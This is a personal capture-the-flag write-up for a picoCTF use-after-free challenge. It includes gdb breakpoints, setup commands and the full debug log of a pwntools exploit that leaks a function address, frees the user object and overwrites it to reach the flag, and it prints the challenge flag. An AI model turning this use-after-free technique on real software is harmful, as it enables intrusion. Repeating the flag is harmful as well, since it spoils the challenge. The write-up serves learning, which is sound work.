https://play.picoctf.org/practice/challenge/187

Personal note :: Was curious how use-after-free vulns are exploited, hence this.

Memory allocation and de-allocation block addresses - fetched via Ghidra

```sh
ghidra auto -t vulnerable_binary
# run complete

gdb ./vulnerable_binary
# logs
(gdb) break *0x08048d6f
Breakpoint 1 at 0x8048d6f
(gdb) break *0x08048a76
Breakpoint 2 at 0x8048a76
(gdb) break *0x08048aff
Breakpoint 3 at 0x8048aff
# stuff i ran
OOP! Memory leak...0x80487d6
(gdb) x/8gwx 0x804c1a0 - 4

0x804c19c:	0x00000011	0x08048988	0x0804c5c0	0x00000000
0x804c1ac:	0x00000411	0x6f740a53	0x000a6f72	0x00000000
```

apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools

### Runtime logs of the exploit script - DEBUG logs enabled

```sh
┌─[✗]─[parrot@parrot]─[~/Downloads/pico_UnsubsAreFree]
└──╼ $python3 exploit.py
[*] Imported pwntools
[*] Creating GDB instance!
[*] ./vuln : True : () : {}
[+] Starting local process '/usr/bin/gdbserver' argv=[b'/usr/bin/gdbserver', b'--multi', b'--no-disable-randomization', b'localhost:0', b'./vuln'] : pid 79599
[DEBUG] Received 0x24 bytes:
    b'Process ./vuln created; pid = 79602\n'
[DEBUG] Received 0x18 bytes:
    b'Listening on port 46033\n'
[DEBUG] Wrote gdb script to '/tmp/pwnm_r2_g0p.gdb'
    target remote 127.0.0.1:46033
    
    break *0x08048d6f
    break *0x08048a76
    break *0x08048aff
    continue
[*] running in new terminal: ['/usr/bin/gdb', '-q', './vuln', '-x', '/tmp/pwnm_r2_g0p.gdb']
[DEBUG] Created script for new terminal:
    #!/usr/bin/python3
    import os
    os.execve('/usr/bin/gdb', ['/usr/bin/gdb', '-q', './vuln', '-x', '/tmp/pwnm_r2_g0p.gdb'], os.environ)
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/tmp/tmphxxrx957']
[DEBUG] Received 0x38 bytes:
    b'Remote debugging from host ::ffff:127.0.0.1, port 42750\n'
[*] debug mode run!!
[*] IO instance: <pwnlib.tubes.process.process object at 0x7f3090f5d0d0>
[DEBUG] Received 0x19 bytes:
    b'Welcome to my stream! ^W^'
[DEBUG] Received 0xc2 bytes:
    b'\n'
    b'==========================\n'
    b'(S)ubscribe to my channel\n'
    b'(I)nquire about account deletion\n'
    b'(M)ake an Twixer account\n'
    b'(P)ay for premium membership\n'
    b'(l)eave a message(with or without logging in)\n'
    b'(e)xit\n'
[DEBUG] Sent 0x2 bytes:
    b'M\n'
[DEBUG] Received 0x53 bytes:
    b'===========================\n'
    b'Registration: Welcome to Twixer!\n'
    b'Enter your username: \n'
[DEBUG] Sent 0x7 bytes:
    b'totoro\n'
[DEBUG] Received 0xec bytes:
    b'Account created.\n'
    b'Welcome to my stream! ^W^\n'
    b'==========================\n'
    b'(S)ubscribe to my channel\n'
    b'(I)nquire about account deletion\n'
    b'(M)ake an Twixer account\n'
    b'(P)ay for premium membership\n'
    b'(l)eave a message(with or without logging in)\n'
    b'(e)xit\n'
[DEBUG] Sent 0x2 bytes:
    b'S\n'
[DEBUG] Received 0x13d bytes:
    b'OOP! Memory leak...0x80487d6\n'
    b'Thanks for subsribing! I really recommend becoming a premium member!\n'
    b'Welcome to my stream! ^W^\n'
    b'==========================\n'
    b'(S)ubscribe to my channel\n'
    b'(I)nquire about account deletion\n'
    b'(M)ake an Twixer account\n'
    b'(P)ay for premium membership\n'
    b'(l)eave a message(with or without logging in)\n'
    b'(e)xit\n'
[*] leak: 0x80487d6
[DEBUG] Sent 0x2 bytes:
    b'I\n'
[DEBUG] Received 0x1d bytes:
    b"You're leaving already(Y/N)?\n"
[DEBUG] Sent 0x2 bytes:
    b'Y\n'
[DEBUG] Received 0x5 bytes:
    b'Bye!\n'
[DEBUG] Received 0x19 bytes:
    b'Welcome to my stream! ^W^'
[DEBUG] Received 0xc2 bytes:
    b'\n'
    b'==========================\n'
    b'(S)ubscribe to my channel\n'
    b'(I)nquire about account deletion\n'
    b'(M)ake an Twixer account\n'
    b'(P)ay for premium membership\n'
    b'(l)eave a message(with or without logging in)\n'
    b'(e)xit\n'
[DEBUG] Sent 0x2 bytes:
    b'L\n'
[DEBUG] Received 0x3e bytes:
    b'I only read premium member messages but you can \n'
    b'try anyways:\n'
[DEBUG] Sent 0x5 bytes:
    00000000  d6 87 04 08  0a                                     │····│·│
    00000005
[DEBUG] Received 0x15 bytes:
    b'PICO{USE_4FTER_FREE}\n'
[!] PICO{USE_4FTER_FREE}
[*] Stopped process './vuln' (pid 79602)
┌─[parrot@parrot]─[~/Downloads/pico_UnsubsAreFree]
└──╼ $
```

